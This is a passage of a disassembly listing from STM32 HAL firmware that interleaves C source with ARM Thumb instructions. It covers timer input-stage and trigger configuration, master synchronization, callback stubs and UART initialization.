  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80051ac:	b480      	push	{r7}
 80051ae:	b087      	sub	sp, #28
 80051b0:	af00      	add	r7, sp, #0
 80051b2:	60f8      	str	r0, [r7, #12]
 80051b4:	60b9      	str	r1, [r7, #8]
 80051b6:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 80051b8:	68fb      	ldr	r3, [r7, #12]
 80051ba:	6a1b      	ldr	r3, [r3, #32]
 80051bc:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 80051be:	68fb      	ldr	r3, [r7, #12]
 80051c0:	6a1b      	ldr	r3, [r3, #32]
 80051c2:	f023 0201 	bic.w	r2, r3, #1
 80051c6:	68fb      	ldr	r3, [r7, #12]
 80051c8:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80051ca:	68fb      	ldr	r3, [r7, #12]
 80051cc:	699b      	ldr	r3, [r3, #24]
 80051ce:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 80051d0:	693b      	ldr	r3, [r7, #16]
 80051d2:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 80051d6:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 80051d8:	687b      	ldr	r3, [r7, #4]
 80051da:	011b      	lsls	r3, r3, #4
 80051dc:	693a      	ldr	r2, [r7, #16]
 80051de:	4313      	orrs	r3, r2
 80051e0:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 80051e2:	697b      	ldr	r3, [r7, #20]
 80051e4:	f023 030a 	bic.w	r3, r3, #10
 80051e8:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 80051ea:	697a      	ldr	r2, [r7, #20]
 80051ec:	68bb      	ldr	r3, [r7, #8]
 80051ee:	4313      	orrs	r3, r2
 80051f0:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 80051f2:	68fb      	ldr	r3, [r7, #12]
 80051f4:	693a      	ldr	r2, [r7, #16]
 80051f6:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80051f8:	68fb      	ldr	r3, [r7, #12]
 80051fa:	697a      	ldr	r2, [r7, #20]
 80051fc:	621a      	str	r2, [r3, #32]
}
 80051fe:	bf00      	nop
 8005200:	371c      	adds	r7, #28
 8005202:	46bd      	mov	sp, r7
 8005204:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005208:	4770      	bx	lr

0800520a <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800520a:	b480      	push	{r7}
 800520c:	b087      	sub	sp, #28
 800520e:	af00      	add	r7, sp, #0
 8005210:	60f8      	str	r0, [r7, #12]
 8005212:	60b9      	str	r1, [r7, #8]
 8005214:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 8005216:	68fb      	ldr	r3, [r7, #12]
 8005218:	6a1b      	ldr	r3, [r3, #32]
 800521a:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 800521c:	68fb      	ldr	r3, [r7, #12]
 800521e:	6a1b      	ldr	r3, [r3, #32]
 8005220:	f023 0210 	bic.w	r2, r3, #16
 8005224:	68fb      	ldr	r3, [r7, #12]
 8005226:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005228:	68fb      	ldr	r3, [r7, #12]
 800522a:	699b      	ldr	r3, [r3, #24]
 800522c:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 800522e:	693b      	ldr	r3, [r7, #16]
 8005230:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 8005234:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 8005236:	687b      	ldr	r3, [r7, #4]
 8005238:	031b      	lsls	r3, r3, #12
 800523a:	693a      	ldr	r2, [r7, #16]
 800523c:	4313      	orrs	r3, r2
 800523e:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 8005240:	697b      	ldr	r3, [r7, #20]
 8005242:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 8005246:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 8005248:	68bb      	ldr	r3, [r7, #8]
 800524a:	011b      	lsls	r3, r3, #4
 800524c:	697a      	ldr	r2, [r7, #20]
 800524e:	4313      	orrs	r3, r2
 8005250:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 8005252:	68fb      	ldr	r3, [r7, #12]
 8005254:	693a      	ldr	r2, [r7, #16]
 8005256:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005258:	68fb      	ldr	r3, [r7, #12]
 800525a:	697a      	ldr	r2, [r7, #20]
 800525c:	621a      	str	r2, [r3, #32]
}
 800525e:	bf00      	nop
 8005260:	371c      	adds	r7, #28
 8005262:	46bd      	mov	sp, r7
 8005264:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005268:	4770      	bx	lr

0800526a <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 800526a:	b480      	push	{r7}
 800526c:	b085      	sub	sp, #20
 800526e:	af00      	add	r7, sp, #0
 8005270:	6078      	str	r0, [r7, #4]
 8005272:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 8005274:	687b      	ldr	r3, [r7, #4]
 8005276:	689b      	ldr	r3, [r3, #8]
 8005278:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 800527a:	68fb      	ldr	r3, [r7, #12]
 800527c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005280:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 8005282:	683a      	ldr	r2, [r7, #0]
 8005284:	68fb      	ldr	r3, [r7, #12]
 8005286:	4313      	orrs	r3, r2
 8005288:	f043 0307 	orr.w	r3, r3, #7
 800528c:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800528e:	687b      	ldr	r3, [r7, #4]
 8005290:	68fa      	ldr	r2, [r7, #12]
 8005292:	609a      	str	r2, [r3, #8]
}
 8005294:	bf00      	nop
 8005296:	3714      	adds	r7, #20
 8005298:	46bd      	mov	sp, r7
 800529a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800529e:	4770      	bx	lr

080052a0 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 80052a0:	b480      	push	{r7}
 80052a2:	b087      	sub	sp, #28
 80052a4:	af00      	add	r7, sp, #0
 80052a6:	60f8      	str	r0, [r7, #12]
 80052a8:	60b9      	str	r1, [r7, #8]
 80052aa:	607a      	str	r2, [r7, #4]
 80052ac:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 80052ae:	68fb      	ldr	r3, [r7, #12]
 80052b0:	689b      	ldr	r3, [r3, #8]
 80052b2:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80052b4:	697b      	ldr	r3, [r7, #20]
 80052b6:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80052ba:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 80052bc:	683b      	ldr	r3, [r7, #0]
 80052be:	021a      	lsls	r2, r3, #8
 80052c0:	687b      	ldr	r3, [r7, #4]
 80052c2:	431a      	orrs	r2, r3
 80052c4:	68bb      	ldr	r3, [r7, #8]
 80052c6:	4313      	orrs	r3, r2
 80052c8:	697a      	ldr	r2, [r7, #20]
 80052ca:	4313      	orrs	r3, r2
 80052cc:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 80052ce:	68fb      	ldr	r3, [r7, #12]
 80052d0:	697a      	ldr	r2, [r7, #20]
 80052d2:	609a      	str	r2, [r3, #8]
}
 80052d4:	bf00      	nop
 80052d6:	371c      	adds	r7, #28
 80052d8:	46bd      	mov	sp, r7
 80052da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052de:	4770      	bx	lr

080052e0 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 80052e0:	b480      	push	{r7}
 80052e2:	b085      	sub	sp, #20
 80052e4:	af00      	add	r7, sp, #0
 80052e6:	6078      	str	r0, [r7, #4]
 80052e8:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 80052ea:	687b      	ldr	r3, [r7, #4]
 80052ec:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 80052f0:	2b01      	cmp	r3, #1
 80052f2:	d101      	bne.n	80052f8 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 80052f4:	2302      	movs	r3, #2
 80052f6:	e04f      	b.n	8005398 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 80052f8:	687b      	ldr	r3, [r7, #4]
 80052fa:	2201      	movs	r2, #1
 80052fc:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005300:	687b      	ldr	r3, [r7, #4]
 8005302:	2202      	movs	r2, #2
 8005304:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005308:	687b      	ldr	r3, [r7, #4]
 800530a:	681b      	ldr	r3, [r3, #0]
 800530c:	685b      	ldr	r3, [r3, #4]
 800530e:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005310:	687b      	ldr	r3, [r7, #4]
 8005312:	681b      	ldr	r3, [r3, #0]
 8005314:	689b      	ldr	r3, [r3, #8]
 8005316:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 8005318:	687b      	ldr	r3, [r7, #4]
 800531a:	681b      	ldr	r3, [r3, #0]
 800531c:	4a21      	ldr	r2, [pc, #132]	; (80053a4 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 800531e:	4293      	cmp	r3, r2
 8005320:	d108      	bne.n	8005334 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 8005322:	68fb      	ldr	r3, [r7, #12]
 8005324:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 8005328:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 800532a:	683b      	ldr	r3, [r7, #0]
 800532c:	685b      	ldr	r3, [r3, #4]
 800532e:	68fa      	ldr	r2, [r7, #12]
 8005330:	4313      	orrs	r3, r2
 8005332:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 8005334:	68fb      	ldr	r3, [r7, #12]
 8005336:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800533a:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 800533c:	683b      	ldr	r3, [r7, #0]
 800533e:	681b      	ldr	r3, [r3, #0]
 8005340:	68fa      	ldr	r2, [r7, #12]
 8005342:	4313      	orrs	r3, r2
 8005344:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 8005346:	687b      	ldr	r3, [r7, #4]
 8005348:	681b      	ldr	r3, [r3, #0]
 800534a:	68fa      	ldr	r2, [r7, #12]
 800534c:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 800534e:	687b      	ldr	r3, [r7, #4]
 8005350:	681b      	ldr	r3, [r3, #0]
 8005352:	4a14      	ldr	r2, [pc, #80]	; (80053a4 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005354:	4293      	cmp	r3, r2
 8005356:	d009      	beq.n	800536c <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005358:	687b      	ldr	r3, [r7, #4]
 800535a:	681b      	ldr	r3, [r3, #0]
 800535c:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005360:	d004      	beq.n	800536c <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005362:	687b      	ldr	r3, [r7, #4]
 8005364:	681b      	ldr	r3, [r3, #0]
 8005366:	4a10      	ldr	r2, [pc, #64]	; (80053a8 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 8005368:	4293      	cmp	r3, r2
 800536a:	d10c      	bne.n	8005386 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 800536c:	68bb      	ldr	r3, [r7, #8]
 800536e:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005372:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 8005374:	683b      	ldr	r3, [r7, #0]
 8005376:	689b      	ldr	r3, [r3, #8]
 8005378:	68ba      	ldr	r2, [r7, #8]
 800537a:	4313      	orrs	r3, r2
 800537c:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 800537e:	687b      	ldr	r3, [r7, #4]
 8005380:	681b      	ldr	r3, [r3, #0]
 8005382:	68ba      	ldr	r2, [r7, #8]
 8005384:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 8005386:	687b      	ldr	r3, [r7, #4]
 8005388:	2201      	movs	r2, #1
 800538a:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800538e:	687b      	ldr	r3, [r7, #4]
 8005390:	2200      	movs	r2, #0
 8005392:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 8005396:	2300      	movs	r3, #0
}
 8005398:	4618      	mov	r0, r3
 800539a:	3714      	adds	r7, #20
 800539c:	46bd      	mov	sp, r7
 800539e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053a2:	4770      	bx	lr
 80053a4:	40012c00 	.word	0x40012c00
 80053a8:	40014000 	.word	0x40014000

080053ac <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 80053ac:	b480      	push	{r7}
 80053ae:	b083      	sub	sp, #12
 80053b0:	af00      	add	r7, sp, #0
 80053b2:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 80053b4:	bf00      	nop
 80053b6:	370c      	adds	r7, #12
 80053b8:	46bd      	mov	sp, r7
 80053ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053be:	4770      	bx	lr

080053c0 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 80053c0:	b480      	push	{r7}
 80053c2:	b083      	sub	sp, #12
 80053c4:	af00      	add	r7, sp, #0
 80053c6:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 80053c8:	bf00      	nop
 80053ca:	370c      	adds	r7, #12
 80053cc:	46bd      	mov	sp, r7
 80053ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053d2:	4770      	bx	lr

080053d4 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 80053d4:	b480      	push	{r7}
 80053d6:	b083      	sub	sp, #12
 80053d8:	af00      	add	r7, sp, #0
 80053da:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 80053dc:	bf00      	nop
 80053de:	370c      	adds	r7, #12
 80053e0:	46bd      	mov	sp, r7
 80053e2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053e6:	4770      	bx	lr

080053e8 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 80053e8:	b580      	push	{r7, lr}
 80053ea:	b082      	sub	sp, #8
 80053ec:	af00      	add	r7, sp, #0
 80053ee:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 80053f0:	687b      	ldr	r3, [r7, #4]
 80053f2:	2b00      	cmp	r3, #0
 80053f4:	d101      	bne.n	80053fa <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 80053f6:	2301      	movs	r3, #1
 80053f8:	e040      	b.n	800547c <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 80053fa:	687b      	ldr	r3, [r7, #4]
 80053fc:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 80053fe:	2b00      	cmp	r3, #0
 8005400:	d106      	bne.n	8005410 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 8005402:	687b      	ldr	r3, [r7, #4]
 8005404:	2200      	movs	r2, #0
 8005406:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 800540a:	6878      	ldr	r0, [r7, #4]
 800540c:	f7fb fd78 	bl	8000f00 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005410:	687b      	ldr	r3, [r7, #4]
 8005412:	2224      	movs	r2, #36	; 0x24
 8005414:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 8005416:	687b      	ldr	r3, [r7, #4]
 8005418:	681b      	ldr	r3, [r3, #0]
 800541a:	681a      	ldr	r2, [r3, #0]
 800541c:	687b      	ldr	r3, [r7, #4]
 800541e:	681b      	ldr	r3, [r3, #0]
 8005420:	f022 0201 	bic.w	r2, r2, #1
 8005424:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 8005426:	687b      	ldr	r3, [r7, #4]
 8005428:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800542a:	2b00      	cmp	r3, #0
 800542c:	d002      	beq.n	8005434 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 800542e:	6878      	ldr	r0, [r7, #4]
 8005430:	f000 fa54 	bl	80058dc <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 8005434:	6878      	ldr	r0, [r7, #4]
 8005436:	f000 f825 	bl	8005484 <UART_SetConfig>
 800543a:	4603      	mov	r3, r0
 800543c:	2b01      	cmp	r3, #1
 800543e:	d101      	bne.n	8005444 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 8005440:	2301      	movs	r3, #1
 8005442:	e01b      	b.n	800547c <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 8005444:	687b      	ldr	r3, [r7, #4]
 8005446:	681b      	ldr	r3, [r3, #0]
 8005448:	685a      	ldr	r2, [r3, #4]
 800544a:	687b      	ldr	r3, [r7, #4]
 800544c:	681b      	ldr	r3, [r3, #0]
 800544e:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 8005452:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8005454:	687b      	ldr	r3, [r7, #4]
 8005456:	681b      	ldr	r3, [r3, #0]
 8005458:	689a      	ldr	r2, [r3, #8]
 800545a:	687b      	ldr	r3, [r7, #4]
 800545c:	681b      	ldr	r3, [r3, #0]
 800545e:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 8005462:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 8005464:	687b      	ldr	r3, [r7, #4]
 8005466:	681b      	ldr	r3, [r3, #0]
 8005468:	681a      	ldr	r2, [r3, #0]
 800546a:	687b      	ldr	r3, [r7, #4]
 800546c:	681b      	ldr	r3, [r3, #0]
 800546e:	f042 0201 	orr.w	r2, r2, #1
 8005472:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 8005474:	6878      	ldr	r0, [r7, #4]
 8005476:	f000 fad3 	bl	8005a20 <UART_CheckIdleState>
 800547a:	4603      	mov	r3, r0
}
 800547c:	4618      	mov	r0, r3
 800547e:	3708      	adds	r7, #8
 8005480:	46bd      	mov	sp, r7
 8005482:	bd80      	pop	{r7, pc}

08005484 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005484:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005488:	b08a      	sub	sp, #40	; 0x28
 800548a:	af00      	add	r7, sp, #0
 800548c:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 800548e:	2300      	movs	r3, #0
 8005490:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 8005494:	68fb      	ldr	r3, [r7, #12]
 8005496:	689a      	ldr	r2, [r3, #8]
 8005498:	68fb      	ldr	r3, [r7, #12]
 800549a:	691b      	ldr	r3, [r3, #16]
 800549c:	431a      	orrs	r2, r3
 800549e:	68fb      	ldr	r3, [r7, #12]
 80054a0:	695b      	ldr	r3, [r3, #20]
 80054a2:	431a      	orrs	r2, r3
 80054a4:	68fb      	ldr	r3, [r7, #12]
 80054a6:	69db      	ldr	r3, [r3, #28]
 80054a8:	4313      	orrs	r3, r2
 80054aa:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 80054ac:	68fb      	ldr	r3, [r7, #12]
 80054ae:	681b      	ldr	r3, [r3, #0]
 80054b0:	681a      	ldr	r2, [r3, #0]
 80054b2:	4bb4      	ldr	r3, [pc, #720]	; (8005784 <UART_SetConfig+0x300>)
 80054b4:	4013      	ands	r3, r2
 80054b6:	68fa      	ldr	r2, [r7, #12]
 80054b8:	6812      	ldr	r2, [r2, #0]
 80054ba:	6a79      	ldr	r1, [r7, #36]	; 0x24
 80054bc:	430b      	orrs	r3, r1
 80054be:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 80054c0:	68fb      	ldr	r3, [r7, #12]
 80054c2:	681b      	ldr	r3, [r3, #0]
 80054c4:	685b      	ldr	r3, [r3, #4]
 80054c6:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 80054ca:	68fb      	ldr	r3, [r7, #12]
 80054cc:	68da      	ldr	r2, [r3, #12]
 80054ce:	68fb      	ldr	r3, [r7, #12]
 80054d0:	681b      	ldr	r3, [r3, #0]
 80054d2:	430a      	orrs	r2, r1
 80054d4:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 80054d6:	68fb      	ldr	r3, [r7, #12]
 80054d8:	699b      	ldr	r3, [r3, #24]
 80054da:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 80054dc:	68fb      	ldr	r3, [r7, #12]
 80054de:	681b      	ldr	r3, [r3, #0]
 80054e0:	4aa9      	ldr	r2, [pc, #676]	; (8005788 <UART_SetConfig+0x304>)
 80054e2:	4293      	cmp	r3, r2
 80054e4:	d004      	beq.n	80054f0 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 80054e6:	68fb      	ldr	r3, [r7, #12]
 80054e8:	6a1b      	ldr	r3, [r3, #32]
 80054ea:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80054ec:	4313      	orrs	r3, r2
 80054ee:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 80054f0:	68fb      	ldr	r3, [r7, #12]
 80054f2:	681b      	ldr	r3, [r3, #0]
 80054f4:	689b      	ldr	r3, [r3, #8]
 80054f6:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 80054fa:	68fb      	ldr	r3, [r7, #12]
 80054fc:	681b      	ldr	r3, [r3, #0]
 80054fe:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005500:	430a      	orrs	r2, r1
 8005502:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005504:	68fb      	ldr	r3, [r7, #12]
 8005506:	681b      	ldr	r3, [r3, #0]
 8005508:	4aa0      	ldr	r2, [pc, #640]	; (800578c <UART_SetConfig+0x308>)
 800550a:	4293      	cmp	r3, r2
 800550c:	d126      	bne.n	800555c <UART_SetConfig+0xd8>
